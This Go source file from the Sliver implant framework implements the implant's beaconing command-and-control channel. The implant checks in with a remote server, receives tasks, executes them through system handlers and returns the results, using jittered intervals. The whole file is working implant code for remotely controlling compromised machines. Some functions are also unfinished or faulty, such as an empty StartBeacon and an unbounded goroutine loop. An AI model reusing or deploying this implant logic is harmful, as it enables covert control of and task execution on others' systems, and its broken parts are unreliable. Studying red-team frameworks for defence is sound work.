package c2

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"errors"
	"log"
	insecureRand "math/rand"
	"sync"
	"time"

	"github.com/gofrs/uuid"
	"github.com/golang/protobuf/proto"

	"github.com/bishopfox/sliver/implant/sliver/handlers"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

// BeaconID - A unique ID for the entire lifetime of this
// session as beacon: might need to change this way to proceed.
var BeaconID string

func init() {
	id, err := uuid.NewV4()
	if err != nil {
		BeaconID = "00000000-0000-0000-0000-000000000000"
	}
	BeaconID = id.String()
}

// Beacon - The most basic Beacon-style C2 channel interface. All beacons Must implement this interface.
type Beacon interface {
	// Action
	// Start() error                // Start handling a beacon-style C2 channel with its appropriate parameters
	Recv() (*pb.Envelope, error) // Receive a a task from the server
	Send(*pb.Envelope) error     // Send the results or part of a task output back to server
	Close() error                // Close an C2 beacon channel instance. Might be many calls

	// Parameters
	Interval() int64
	Jitter() int64
	Duration() time.Duration
}

// StartBeacon - Start the beacon transport. Equivalent to StartSession()
func (t *C2) StartBeacon() (err error) {

	// Enter the beaconing loop and run each connection run in the background.
	// Only exits when we have reached the maximum number of connection failures.

	return
}

// ServeBeacon - Loop and continuously perform
// beaconing according to the transport settings.
func (t *C2) ServeBeacon() {

	// Create a new beacon base type, which is passed to specialized C2 channels
	t.Beacon = &beacon{
		interval:   t.Profile.Interval,
		jitter:     t.Profile.Jitter,
		connection: t.Connection,
	}

	for {
		// Only exits when we have reached the maximum number
		// of connection failures for this precise beaconing
		if t.attempts > int(t.Profile.MaxConnectionErrors) {
			return
		}

		// Run a beaconing process (connect, set up RPC, process tasks)
		// In the background so that if tasks do not complete, does not
		// block any next runs and their associated tasks.
		go t.HandleBeaconTasks()
	}
}

// HandleBeaconTasks - Listens for tasks, executes them and sends the results in the background,
func (t *C2) HandleBeaconTasks() {

	// Setup the physical connection if needed (will return without errors if not)
	if t.Conn == nil {
		err := t.startTransport()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error starting connection: %s", err)
			// {{end}}
			t.FailedAttempt()
			return
		}
	}

	// Setup the session connection. This is always needed
	if t.Connection == nil {
		err := t.StartSession()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error setting up connection: %s", err)
			// {{end}}
			t.FailedAttempt()
			return
		}
	}

	// {{if .Config.Debug}}
	log.Printf("[beacon] sending check in ...")
	// {{end}}
	nextCheckin := time.Now().Add(t.Beacon.Duration())
	err := t.Beacon.Send(Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
		ID:          BeaconID,
		NextCheckin: nextCheckin.UTC().Unix(),
	}))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] send failure %s", err)
		// {{end}}
		t.FailedAttempt()
		return
	}

	// At this point, we don't increase the number of failed attempts, because the issue
	// is clearly not a connectivity issue (the whole C2 stack is set up and should be fine)

	// {{if .Config.Debug}}
	log.Printf("[beacon] recv task(s) ...")
	// {{end}}
	envelope, err := t.Beacon.Recv()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] recv failure %s", err)
		// {{end}}
		return
	}
	tasks := &pb.BeaconTasks{}
	err = proto.Unmarshal(envelope.Data, tasks)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] unmarshal failure %s", err)
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] received %d task(s) from server", len(tasks.Tasks))
	// {{end}}
	if len(tasks.Tasks) == 0 {
		return
	}

	// Start executing all tasks concurrently, and wait until they complete.
	wg := &sync.WaitGroup{}
	results := t.ExecuteBeaconTasks(wg, tasks.Tasks)

	// {{if .Config.Debug}}
	log.Printf("[beacon] waiting for task(s) to complete ...")
	// {{end}}
	wg.Wait() // Wait for all tasks to complete
	// {{if .Config.Debug}}
	log.Printf("[beacon] all tasks completed, sending results to server")
	// {{end}}

	err = t.Beacon.Send(Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
		ID:    BeaconID,
		Tasks: results,
	}))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] error sending results %s", err)
		// {{end}}
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] all results sent to server, cleanup ...")
	// {{end}}
}

// ExecuteBeaconTasks - Concurrently performs all the tasks in a request and
// populate the results. This blocks until all goroutines have finished.
func (t *C2) ExecuteBeaconTasks(wg *sync.WaitGroup, tasks []*pb.Envelope) (results []*pb.Envelope) {
	resultsMutex := &sync.Mutex{}

	// Register commands compatible with beacons.
	sysHandlers := handlers.GetSystemHandlers()

	for _, task := range tasks {
		// {{if .Config.Debug}}
		log.Printf("[beacon] execute task %#v", task)
		// {{end}}
		if handler, ok := sysHandlers[task.Type]; ok {
			wg.Add(1)
			data := task.Data
			taskID := task.ID
			go handler(data, func(data []byte, err error) {
				resultsMutex.Lock()
				defer resultsMutex.Unlock()
				defer wg.Done()
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[beacon] handler function returned an error: %s", err)
				}
				log.Printf("[beacon] task completed (id: %d)", taskID)
				// {{end}}
				results = append(results, &pb.Envelope{
					ID:   taskID,
					Data: data,
				})
			})
			// } else if task.Type == sliverpb.MsgOpenSession {
			//         go openSessionHandler(task.Data)
			//         resultsMutex.Lock()
			//         results = append(results, &sliverpb.Envelope{
			//                 ID:   task.ID,
			//                 Data: []byte{},
			//         })
			//         resultsMutex.Unlock()
		} else {
			resultsMutex.Lock()
			results = append(results, &pb.Envelope{
				ID:                 task.ID,
				UnknownMessageType: true,
			})
			resultsMutex.Unlock()
		}
	}
	return
}

// registerBeacon - Prepare a beacon registration message.
func (t *C2) registerBeacon() *pb.Envelope {
	nextBeacon := time.Now().Add(t.Beacon.Duration())
	return Envelope(pb.MsgBeaconRegister, &pb.BeaconRegister{
		ID:          BeaconID,
		Interval:    t.Beacon.Interval(),
		Jitter:      t.Beacon.Jitter(),
		Register:    t.registerSliver(),
		NextCheckin: nextBeacon.UTC().Unix(),
	})
}

// beacon - base beaconing implementation: connection setup and orchestration logic
type beacon struct {
	interval   int64
	jitter     int64
	duration   time.Duration
	connection Connection
}

// Start - Start handling a beacon-style C2 channel with its appropriate parameters
// func (b *beacon) Start() error {
//         panic("not implemented") // TODO: Implement
// }

// Recv - Receive a a task from the server. Blocks until one is received.
func (b *beacon) Recv() (*pb.Envelope, error) {
	incoming := b.connection.RequestRecv()

	// Wait for and read one envelope and return
	for envelope := range incoming {
		if envelope == nil {
			return nil, errors.New("received nil envelope from underlying TLV connection")
		}
		return envelope, nil
	}
	return nil, errors.New("did not received any envelope in Recv call")
}

// Send - Send the results or part of a task output back to server. Not blocking
func (b *beacon) Send(envelope *pb.Envelope) error {
	b.connection.RequestSend(envelope)
	return nil
}

// Close an C2 beacon channel instance. This base implementation kills the
// underlying connection if there is one, and returns. This allows transparent
// control over all net.Conn based transports
func (b *beacon) Close() error {
	// {{if .Config.Debug}}
	log.Printf("[beacon] closing ...")
	// {{end}}
	if b.connection != nil {
		return b.connection.Close()
	}
	return nil
}

// Parameters
func (b *beacon) Interval() int64 {
	return b.interval
}

func (b *beacon) Jitter() int64 {
	return b.jitter
}

func (b *beacon) Duration() time.Duration {
	// {{if .Config.Debug}}
	log.Printf("Interval: %v Jitter: %v", b.Interval(), b.Jitter())
	// {{end}}
	jitterDuration := time.Duration(0)
	if 0 < b.Jitter() {
		jitterDuration = time.Duration(int64(insecureRand.Intn(int(b.Jitter()))))
	}
	b.duration = time.Duration(b.Interval()) + jitterDuration
	// {{if .Config.Debug}}
	log.Printf("Duration: %v", b.duration)
	// {{end}}
	return b.duration
}
